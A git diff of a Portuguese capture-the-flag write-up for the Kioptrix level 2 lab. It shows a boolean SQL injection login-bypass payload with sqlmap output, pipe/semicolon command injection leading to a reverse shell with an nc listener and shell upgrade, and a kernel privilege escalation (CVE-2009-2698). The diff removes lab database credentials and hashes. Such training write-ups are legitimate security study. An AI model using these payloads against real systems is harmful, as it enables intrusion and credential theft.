@@ -1,32 +1,37 @@
 ---
-title: Vulnhub Kioptrix level 2
+title: Kioptrix level 2 Write-up
 author: Pr3ach3r
-tags: [kioptrix, ctf, walkthrough, sqlinjection, rce, CVE-2009-2698]
-draft: true
+tags:
+  - kioptrix
+  - ctf
+  - walkthrough
+  - sqlinjection
+  - rce
+  - CVE-2009-2698
+draft: false
 ---
-![teste](content/images/kioptrix2/vulnhub-logo.png)
 
-# Kioptrix level 2 Walkthrough
+# Explorando injeção de comandos e kernel exploits
+
+![teste](images/kioptrix2/vulnhub-logo.png)
 
 ## Introdução
 
 Essa foi a segunda máquina em que consegui obter `root`. Dessa vez tive menos trabalho pois segui o padrão que aprendi na primeira: Enumere o máximo que puder, use muito o google e daí explore as vulnerabilidades que encontrar.
 
-Meu objetivo com esse walkthrough é praticar a documentação de *pentest*, pois no final das contas, o que importa para uma empresa ao contratar um pentest é ter um relatório bem escrito.
-
 Pois bem, vamos ao que interessa.
 
-**IP da máquina**
-
-10.0.2.15
+| **IP da máquina** |
+| ----------------- |
+| 10.0.2.15         |
 
 ## Enumeração de Serviços
 
 Nessa fase faço uma varredura de portas e serviços rodando em servidor. Alguns serviços estão desatualizados, sendo passíveis de serem atacados usando exploits públicos. Há várias ferramentas para fazer essas varreduras, mas a mais utilizada é o [[NMAP]].
 
-Endereço IP       | Portas Abertas
-------------------|----------------------------------------
-10.0.2.15         | **TCP**: 22,80,111,443,631
+| Endereço IP | Portas Abertas             |
+| ----------- | -------------------------- |
+| 10.0.2.15   | **TCP**: 22,80,111,443,631 |
 
 **comando**: *nmap -sV -A -oN kio2-nmap 10.0.2.15*
 
@@ -114,13 +119,12 @@ Rodando a ferramenta sqlmap, verifiquei se a página tinha vulnerabilidade a ata
 **Explicação:** 
 
 > [!info]
->Quando o código inserido pelo usuário não é apropriadamente sanitizado, um usuário mal intencionado pode injetar *queries sql*, que são comandos na linguagem do banco de dados. O servidor aceitará esses comandos como confiáveis e retornará ao hacker a informação solicitada. Esse é um dos ataques mais comuns, sendo listado no top 10 da OWASP. Um sql injection boolean-based abusa da lógica de parâmetros de verdadeiro e falso. 
+>Quando o código inserido pelo usuário não é apropriadamente sanitizado, um usuário mal intencionado pode injetar *queries sql*, que são comandos na linguagem do banco de dados. O servidor aceitará esses comandos como confiáveis e retornará ao hacker a informação solicitada. Esse é um dos ataques mais comuns, sendo listado no [[Owasp top 10]]. Um sql injection boolean-based abusa da lógica de parâmetros de verdadeiro e falso. 
 
 Exemplo: 
 
 ```bash
 admin'or 1=1-- -
-
 ```
 
 Esse código diz que o banco de dados deve verificar a existência de um usuário chamado `admin`. Mas ao adicionar a aspa simples " ' ", o servidor passa a ler o restante do código como uma query sql. O próximo trecho diz que a condição para o servidor liberar o acesso ao usuário é se 1 for igual a 1. Como essa condição é verdadeira, o acesso é facilmente burlado.
@@ -133,7 +137,7 @@ Esse código diz que o banco de dados deve verificar a existência de um usuári
 **Prova de Conceito:**
 Trecho do sqlmap que contém o payload usado:
 
-```bash
+```bash {12}
 [19:08:16] [INFO] checking if the injection point on POST parameter 'uname' is a false positive
 POST parameter 'uname' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
 sqlmap identified the following injection point(s) with a total of 574 HTTP(s) requests:
@@ -180,7 +184,7 @@ Na gravura a seguir vemos que o formulário é uma espécie de *web console* que
 
 ![ping 8.8.8.8](content/images/kioptrix2/k2-3.png)
 
-Por receber comandos do usuário e realizar no servidor, usei a tecnica de criar um shell reverso usando o web console:
+O servidor recebe comandos do usuário e os realiza sem sanitizá-los. O que aconteceria se junto ao IP fosse fornecido um *pipe* `|`  ou um *ponto e vírgula* `;` ?Eu poderia inserir um comando adicional ao esperado pelo servidor. Assim invoquei umu shell reverso usando o web console:
 
 ![web console injetado](content/images/kioptrix2/k2-4.png)
 
@@ -192,11 +196,13 @@ $ nc -lnvp 1234
 listening on 1234 ...                           
 connect to [10.0.2.11] from [10.0.2.15] 32782
 bash:no job control in this shell 
+# fazendo upgrade de shell invocando bash com python tty
 $ python -c 'import pty;pty.spawn("/bin/bash")'
 bash-3$ export TERM=xterm-256color
 bash-3$^Z
 $ stty raw -echo;fg
-[1] + continued  nc -lnvp 1234   
+[1] + continued  nc -lnvp 1234  
+# agora é possível usar CTRL + C, TAB e o comando clear. 
 bash-3$ clear
 bash-3$ ls
 index.php pingit.php 
@@ -206,89 +212,6 @@ drwxr-xr-x 2 root root 4096 Oct  8  2009 .
 drwxr-xr-x 8 root root 4096 Oct  7  2009 ..
 -rwxr-Sr-t 1 root root 1733 Feb  9  2012 index.php
 -rwxr-Sr-t 1 root root  199 Oct  8  2009 pingit.php
-#arquivo index.php contem a senha do usuario john no mysql
-bash-3$ cat index.php
-<?php
-       mysql_connect("localhost", "john", "hiroshima") or die(mysql_error());
-       //print "Connected to MySQL <br/>";
-        mysql_select_db("webapp");
-
-#acessando mysql
-
-bash-3$ mysql -u john
-ERROR 1045(28000): Access denied for user 'john'@'localhost' (using password: NO)
-bash-3$mysql -u john -p
-Enter password:
-Welcome to the MySQL monitor. Commands end with ; or \g.
-MySQL connection id is 24631 to server version: 4.1.22
-Type 'help;' or '\h' for help. Type '\c' to clear the buffer.
-
-#conectando ao banco de dados
-mysql> show databases;
-+----------+
-| Database |
-+----------+
-| mysql    |
-| test     |
-| webapp   |
-+----------+
-3 rows in set (0.01 sec)
-
-mysql>use webapp
-
-Database changed
-
-#lendo a table 'users'
-
-mysql> select * from users;
-+------+----------+------------+
-| id   | username | password   |
-+------+----------+------------+
-|    1 | admin    | 5afac8d85f |
-|    2 | john     | 66lajGGbla |
-+------+----------+------------+
-2 rows in set (0.00 sec)
-
-mysql> use mysql
-Reading table information for completion of table and column names
-You can turn off this feature to get a quicker startup with -A
-
-Database changed
-mysql> show tables;
-+---------------------------+
-| Tables_in_mysql           |
-+---------------------------+
-| columns_priv              |
-| db                        |
-| func                      |
-| help_category             |
-| help_keyword              |
-| help_relation             |
-| help_topic                |
-| host                      |
-| tables_priv               |
-| time_zone                 |
-| time_zone_leap_second     |
-| time_zone_name            |
-| time_zone_transition      |
-| time_zone_transition_type |
-| user                      |
-+---------------------------+
-15 rows in set (0.00 sec)
-
-mysql> select User,Password from user;
-+------+------------------+
-| User | Password         |
-+------+------------------+
-| root | 5a6914ba69e02807 |
-| root | 5a6914ba69e02807 |
-|      |                  |
-|      |                  |
-| john | 5a6914ba69e02807 |
-+------+------------------+
-5 rows in set (0.00 sec)
-
-
 ```
 Shell obtida:
 
@@ -296,7 +219,7 @@ Shell obtida:
 
 ## Pós exploração
 
-Nessa fase procuro elevar os privilégios de usuário e manter acesso persistente na máquina alvo. O alvo era vulnerável a uma falha no kernel linux, na sua versão 2.6.19. Para saber a versão do kernel no linux use o comando *uname -a*.
+Nessa fase procuro elevar os privilégios de usuário e manter acesso persistente na máquina alvo. O alvo era vulnerável a uma falha no kernel linux, na sua versão 2.6.19. Para saber a versão do kernel no linux usei o comando *uname -a*.
 
 **Vulnerabilidade:** CVE-2009-2698
 
@@ -349,4 +272,4 @@ Após todas as descobertas, podemos resumir os achados da seguinte forma:
 1                     | Crítico
 
 
-Nessa máquina aprendi um pouco mais sobre *sqlinjection*, *kernel exploit* e má sanitização de *inputs* de usuários. Se você também está numa jornada de aprendizado de pentest, lembre-se: É mais importante entender o processo do que chegar rapidamente ao root. As empresas não se importam se você é o mr Robot e consegue rootar qualquer máquina do *hackthebox*. O que elas querem é saber se você sabe como solucionar as vulnerabilidades que podem custar muito dinheiro em prejuízo para elas. Entender o processo e os porquês de cada falha, bem como saber qual solução é a mais apropriada é o que diferencia um pentester de um *scriptkiddie*. Até o próximo walkthrough.
+Nessa máquina aprendi um pouco mais sobre *sqlinjection*, *kernel exploit* e má sanitização de *inputs* de usuários. 
